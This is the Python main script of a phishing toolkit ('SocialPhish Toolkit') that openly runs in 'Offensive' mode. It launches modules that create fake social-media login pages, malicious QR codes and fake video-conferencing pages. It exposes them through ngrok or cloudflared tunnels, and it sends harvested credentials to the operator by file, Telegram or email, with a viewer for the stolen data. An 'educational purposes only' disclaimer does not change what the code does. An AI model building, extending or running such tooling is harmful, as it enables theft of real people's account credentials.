#!/usr/bin/env python3

import os
import sys
import argparse
import platform
import subprocess
import signal
import json
import time
import psutil
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.layout import Layout
import pyfiglet
from rich import box
from modules.qr_phisher import QRPhisher
from modules.social_phisher import SocialPhisher
from modules.camera_phisher import CameraPhisher
from rich.prompt import Prompt
from rich.text import Text

console = Console()

# Global variables for process management
ngrok_process = None
cloudflared_process = None

def is_process_running(process):
    """Check if a process is running."""
    if process is None:
        return False
    try:
        return process.poll() is None
    except:
        return False

def kill_process(process):
    """Safely kill a process and its children."""
    if process is None:
        return
    
    try:
        parent = psutil.Process(process.pid)
        for child in parent.children(recursive=True):
            try:
                child.kill()
            except psutil.NoSuchProcess:
                pass
        parent.kill()
    except (psutil.NoSuchProcess, ProcessLookupError):
        pass

def cleanup_processes():
    """Cleanup all running processes."""
    global ngrok_process, cloudflared_process
    kill_process(ngrok_process)
    kill_process(cloudflared_process)

def signal_handler(signum, frame):
    """Handle cleanup on program exit."""
    cleanup_processes()
    sys.exit(0)

# Register signal handlers
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def print_banner():
    """Create a responsive banner that adapts to terminal size."""
    try:
        # Get terminal size
        terminal_width = os.get_terminal_size().columns
        terminal_height = os.get_terminal_size().lines
        
        # Adjust font size based on terminal width
        font_name = "standard" if terminal_width >= 80 else "small"
        
        # Create the ASCII banner with adjusted width
        banner = pyfiglet.figlet_format("S-Phish Tool", font=font_name, width=terminal_width)
        styled_banner = ""
        colors = ["red", "yellow", "magenta", "cyan"]
        lines = banner.split('\n')
        
        # Process each line with dynamic width
        for i, line in enumerate(lines):
            if line.strip():
                color = colors[i % len(colors)]
                # Center the line within the terminal width
                padding = max(0, (terminal_width - len(line)) // 2)
                styled_line = " " * padding + line
                styled_banner += f"[{color}]{styled_line}[/{color}]\n"
        
        # Create responsive layout
        layout = Layout()
        
        # Adjust ratios based on terminal height
        banner_ratio = min(12, terminal_height // 3)
        status_ratio = min(3, terminal_height // 8)
        warning_ratio = min(3, terminal_height // 8)
        
        layout.split_column(
            Layout(name="banner", ratio=banner_ratio),
            Layout(name="status", ratio=status_ratio),
            Layout(name="warning", ratio=warning_ratio)
        )
        
        # Create panels with dynamic width
        banner_panel = Panel(
            styled_banner,
            border_style="bright_red",
            padding=(1, 2),
            title="[bright_yellow]≫[/bright_yellow] [bright_red]Social Engineering Toolkit[/bright_red] [bright_yellow]≪[/bright_yellow]",
            subtitle="[bright_cyan]« Created by Iksoft Original »[/bright_cyan]",
            box=box.DOUBLE_EDGE,
            width=min(terminal_width - 4, 120)  # Max width of 120 or terminal width - 4
        )
        
        status_text = "[bright_green][ System Ready ][/bright_green] | [yellow]Status:[/yellow] [green]Active[/green] | [yellow]Mode:[/yellow] [red]Offensive[/red]"
        status_panel = Panel(
            status_text,
            border_style="bright_green",
            box=box.HEAVY,
            padding=(1, 2),
            title="[yellow]System Status[/yellow]",
            width=min(terminal_width - 4, 120)
        )
        
        warning_text = "[red blink]⚠ ATTENTION ⚠[/red blink]\n[bright_red]USE AT YOUR OWN RISK! This tool is for educational purposes only.[/bright_red]"
        if terminal_width >= 80:
            warning_text += "\n[bright_red]The developer is not responsible for any misuse or damage.[/bright_red]"
            
        warning_panel = Panel(
            warning_text,
            title="[yellow]Disclaimer[/yellow]",
            border_style="red",
            box=box.HEAVY,
            padding=(1, 2),
            width=min(terminal_width - 4, 120)
        )
        
        # Update layout with responsive panels
        layout["banner"].update(banner_panel)
        layout["status"].update(status_panel)
        layout["warning"].update(warning_panel)
        
        # Print layout with adjusted margins
        console.print("\n")
        console.print(layout)
        console.print("\n")
        
    except Exception as e:
        # Fallback to simple banner if there's an error
        console.print("[bold red]SocialPhish Toolkit[/bold red]")
        console.print("[yellow]A Social Engineering Framework[/yellow]\n")

def setup_argparse():
    parser = argparse.ArgumentParser(description='SocialPhish Toolkit - A Social Engineering Framework')
    parser.add_argument('-m', '--module', help='Specify module to run', choices=['qr', 'social', 'camera'])
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    return parser.parse_args()

def show_menu():
    """Display a responsive menu that adapts to terminal size."""
    try:
        # Get terminal width
        terminal_width = os.get_terminal_size().columns
        
        # Create table with dynamic width
        table = Table(
            title="[bright_red]Available Modules[/bright_red]",
            box=box.DOUBLE_EDGE,
            border_style="bright_green",
            width=min(terminal_width - 4, 100)  # Max width of 100 or terminal width - 4
        )
        
        # Add columns with proportional widths
        id_width = min(6, terminal_width // 10)
        desc_width = max(20, terminal_width - id_width - 40)  # Ensure description has enough space
        
        table.add_column("[cyan]ID[/cyan]", style="cyan", justify="center", width=id_width)
        table.add_column("[green]Module[/green]", style="green", width=30)
        table.add_column("[yellow]Description[/yellow]", style="yellow", width=desc_width)
        
        # Add rows with dynamic content based on terminal width
        if terminal_width < 60:
            # Simplified descriptions for narrow terminals
            table.add_row("01", "[bright_green]Social Phishing[/bright_green]", "Social platforms")
            table.add_row("02", "[bright_green]QR Phishing[/bright_green]", "QR codes")
            table.add_row("03", "[bright_green]Camera Phishing[/bright_green]", "Camera access")
            table.add_row("04", "[bright_green]Settings[/bright_green]", "Configure")
            table.add_row("05", "[bright_green]Harvested[/bright_green]", "View data")
            table.add_row("06", "[bright_red]Exit[/bright_red]", "Exit")
        else:
            # Full descriptions for wider terminals
            table.add_row(
                "01", 
                "[bright_green]Social Media Phishing[/bright_green]", 
                "Create phishing pages for social platforms"
            )
            table.add_row(
                "02", 
                "[bright_green]QR Phishing[/bright_green]", 
                "Create malicious QR codes for phishing"
            )
            table.add_row(
                "03", 
                "[bright_green]Camera Phishing[/bright_green]", 
                "Create fake video conferencing and streaming pages"
            )
            table.add_row(
                "04", 
                "[bright_green]Settings[/bright_green]", 
                "Configure output and notification settings"
            )
            table.add_row(
                "05", 
                "[bright_green]Harvested Details[/bright_green]", 
                "View all harvested credentials"
            )
            table.add_row(
                "06", 
                "[bright_red]Exit[/bright_red]", 
                "Exit the toolkit"
            )
        
        # Create panel with dynamic width
        panel = Panel(
            table,
            border_style="bright_green",
            box=box.HEAVY_EDGE,
            width=min(terminal_width - 2, 102)  # Max width of 102 or terminal width - 2
        )
        
        console.print(panel)
        
    except Exception as e:
        # Fallback to simple menu if there's an error
        console.print("\n[bold]Available Options:[/bold]")
        console.print("1. Social Media Phishing")
        console.print("2. QR Phishing")
        console.print("3. Camera Phishing")
        console.print("4. Settings")
        console.print("5. Harvested Details")
        console.print("6. Exit\n")

def manage_settings():
    """Manage toolkit settings."""
    settings_file = 'config/landing_settings.json'
    settings = {}
    
    # Load existing settings if available
    if os.path.exists(settings_file):
        with open(settings_file, 'r') as f:
            settings = json.load(f)
    
    while True:
        console.print(Panel("[bold blue]Settings Management[/bold blue]"))
        console.print("\n1. View Current Settings")
        console.print("2. Configure Output Method")
        console.print("3. Configure Telegram Settings")
        console.print("4. Configure Email Settings")
        console.print("5. Configure Ngrok Settings")
        console.print("6. Reset All Settings")
        console.print("7. Save and Return")
        
        choice = Prompt.ask("Select option", choices=["1", "2", "3", "4", "5", "6", "7"])
        
        if choice == "1":
            console.print("\n")
            
            # Output Method Settings
            output_table = Table(title="[bold cyan]Output Method Settings[/bold cyan]", show_header=True, header_style="bold magenta", show_lines=True)
            output_table.add_column("Setting", style="cyan")
            output_table.add_column("Value", style="yellow")
            output_table.add_row("Output Method", settings.get('output_method', '[italic]Not configured - Using default: file[/italic]'))
            output_table.add_row("Output File", settings.get('output_file', '[italic]Not configured - Using default: output/harvested/credentials.txt[/italic]'))
            console.print(output_table)
            console.print("\n")
            
            # Telegram Settings
            telegram_table = Table(title="[bold cyan]Telegram Settings[/bold cyan]", show_header=True, header_style="bold magenta", show_lines=True)
            telegram_table.add_column("Setting", style="cyan")
            telegram_table.add_column("Value", style="yellow")
            telegram_table.add_row(
                "Bot Token",
                "********" + settings['telegram_bot_token'][-4:] if settings.get('telegram_bot_token') else "[italic]Not configured[/italic]"
            )
            telegram_table.add_row(
                "Chat ID",
                settings.get('telegram_chat_id', "[italic]Not configured[/italic]")
            )
            console.print(telegram_table)
            console.print("\n")
            
            # Email Settings
            email_table = Table(title="[bold cyan]Email Settings[/bold cyan]", show_header=True, header_style="bold magenta", show_lines=True)
            email_table.add_column("Setting", style="cyan")
            email_table.add_column("Value", style="yellow")
            email_table.add_row(
                "SMTP Server",
                settings.get('email_smtp_server', "[italic]Not configured[/italic]")
            )
            email_table.add_row(
                "SMTP Port",
                str(settings.get('email_smtp_port', "[italic]Not configured - Default: 587[/italic]"))
            )
            email_table.add_row(
                "Email Address",
                settings.get('email_address', "[italic]Not configured[/italic]")
            )
            email_table.add_row(
                "Email Password",
                "********" if settings.get('email_password') else "[italic]Not configured[/italic]"
            )
            email_table.add_row(
                "Notification Email",
                settings.get('notification_email', "[italic]Not configured[/italic]")
            )
            console.print(email_table)
            console.print("\n")
            
            # Ngrok Settings
            ngrok_table = Table(title="[bold cyan]Ngrok Settings[/bold cyan]", show_header=True, header_style="bold magenta", show_lines=True)
            ngrok_table.add_column("Setting", style="cyan")
            ngrok_table.add_column("Value", style="yellow")
            ngrok_table.add_row(
                "Ngrok Token",
                "********" + settings['ngrok_token'][-4:] if settings.get('ngrok_token') else "[italic]Not configured[/italic]"
            )
            console.print(ngrok_table)
            console.print("\n")
            
            console.print("[cyan]Press Enter to continue...[/cyan]")
            input()
            
        elif choice == "2":
            console.print("\nSelect output method:")
            console.print("1. File")
            console.print("2. Telegram")
            console.print("3. Email")
            output_choice = Prompt.ask("Choose method", choices=["1", "2", "3"])
            
            method_map = {"1": "file", "2": "telegram", "3": "email"}
            settings['output_method'] = method_map[output_choice]
            console.print("[green]Output method updated[/green]")
            
        elif choice == "3":
            settings['telegram_bot_token'] = Prompt.ask("Enter Telegram Bot Token", password=True)
            settings['telegram_chat_id'] = Prompt.ask("Enter Telegram Chat ID")
            console.print("[green]Telegram settings updated[/green]")
            
        elif choice == "4":
            settings['email_smtp_server'] = Prompt.ask("Enter SMTP Server")
            settings['email_smtp_port'] = int(Prompt.ask("Enter SMTP Port", default="587"))
            settings['email_address'] = Prompt.ask("Enter Email Address")
            settings['email_password'] = Prompt.ask("Enter Email Password", password=True)
            settings['notification_email'] = Prompt.ask("Enter Notification Email (where to send alerts)")
            console.print("[green]Email settings updated[/green]")
            
        elif choice == "5":
            settings['ngrok_token'] = Prompt.ask("Enter Ngrok Authtoken", password=True)
            console.print("[green]Ngrok settings updated[/green]")
            
        elif choice == "6":
            confirm = Prompt.ask("[red]Are you sure you want to reset all settings? (yes/no)[/red]", choices=["yes", "no"])
            if confirm == "yes":
                settings = {}  # Reset all settings to empty
                if os.path.exists(settings_file):
                    os.remove(settings_file)  # Remove the settings file
                console.print("[green]All settings have been reset successfully[/green]")
            else:
                console.print("[yellow]Reset cancelled[/yellow]")
            
        elif choice == "7":
            # Create config directory if it doesn't exist
            os.makedirs('config', exist_ok=True)
            
            # Save settings
            with open(settings_file, 'w') as f:
                json.dump(settings, f, indent=4)
            console.print("[green]Settings saved successfully[/green]")
            break

def start_tunnel_service(service_type, port):
    """Start and manage tunnel services (ngrok/cloudflared)."""
    global ngrok_process, cloudflared_process
    
    if service_type == "ngrok":
        # Check if ngrok is already running
        if is_process_running(ngrok_process):
            console.print("[yellow]Ngrok is already running[/yellow]")
            return True
            
        # Kill any existing ngrok processes
        cleanup_processes()
        
        try:
            if platform.system() == "Windows":
                ngrok_process = subprocess.Popen(
                    ["ngrok", "http", str(port)],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                ngrok_process = subprocess.Popen(
                    ["ngrok", "http", str(port)],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
            time.sleep(3)  # Wait for ngrok to start
            return True
        except Exception as e:
            console.print(f"[red]Error starting ngrok: {str(e)}[/red]")
            return False
            
    elif service_type == "cloudflared":
        # Check if cloudflared is already running
        if is_process_running(cloudflared_process):
            console.print("[yellow]Cloudflared is already running[/yellow]")
            return True
            
        # Kill any existing cloudflared processes
        cleanup_processes()
        
        try:
            if platform.system() == "Windows":
                cloudflared_process = subprocess.Popen(
                    ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                cloudflared_process = subprocess.Popen(
                    ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
            time.sleep(3)  # Wait for cloudflared to start
            return True
        except Exception as e:
            console.print(f"[red]Error starting cloudflared: {str(e)}[/red]")
            return False
    
    return False

def show_harvested_details():
    """Display all harvested credentials."""
    harvested_file = os.path.join('output', 'harvested', 'social_credentials.txt')
    
    if not os.path.exists(harvested_file):
        console.print("[yellow]No harvested credentials found![/yellow]")
        return
        
    try:
        with open(harvested_file, 'r') as f:
            content = f.read().strip()
            
        if not content:
            console.print("[yellow]No harvested credentials found![/yellow]")
            return
            
        # Create a panel to display the harvested details
        panel = Panel(
            content,
            title="[bold red]Harvested Credentials[/bold red]",
            border_style="bright_green",
            padding=(1, 2)
        )
        console.print("\n")
        console.print(panel)
        console.print("\n")
        
        # Ask if user wants to clear the file
        if Prompt.ask("Would you like to clear harvested data?", choices=["y", "n"], default="n") == "y":
            with open(harvested_file, 'w') as f:
                f.write('')
            console.print("[green]Harvested data cleared successfully![/green]")
            
    except Exception as e:
        console.print(f"[red]Error reading harvested credentials: {str(e)}[/red]")

def main():
    try:
        args = setup_argparse()
        print_banner()
        
        if args.module:
            if args.module == 'qr':
                qr_phisher = QRPhisher()
                qr_phisher.run()
            elif args.module == 'social':
                social_phisher = SocialPhisher()
                social_phisher.run()
            elif args.module == 'camera':
                camera_phisher = CameraPhisher()
                camera_phisher.run()
        else:
            while True:
                show_menu()
                # Accept both formats: 1/01, 2/02, etc.
                choice = Prompt.ask("Select an option", choices=["1", "01", "2", "02", "3", "03", "4", "04", "5", "05", "6", "06"])
                
                # Normalize the choice to remove leading zero
                choice = str(int(choice))
                
                if choice == "1":
                    social_phisher = SocialPhisher()
                    social_phisher.run()
                elif choice == "2":
                    qr_phisher = QRPhisher()
                    qr_phisher.run()
                elif choice == "3":
                    camera_phisher = CameraPhisher()
                    camera_phisher.run()
                elif choice == "4":
                    manage_settings()
                elif choice == "5":
                    show_harvested_details()
                elif choice == "6":
                    cleanup_processes()
                    console.print("[green]Thank you for using SocialPhish Toolkit![/green]")
                    sys.exit(0)
    except KeyboardInterrupt:
        cleanup_processes()
        console.print("\n[yellow]Exiting...[/yellow]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[red]An error occurred: {str(e)}[/red]")
        cleanup_processes()
        sys.exit(1)

if __name__ == "__main__":
    main() 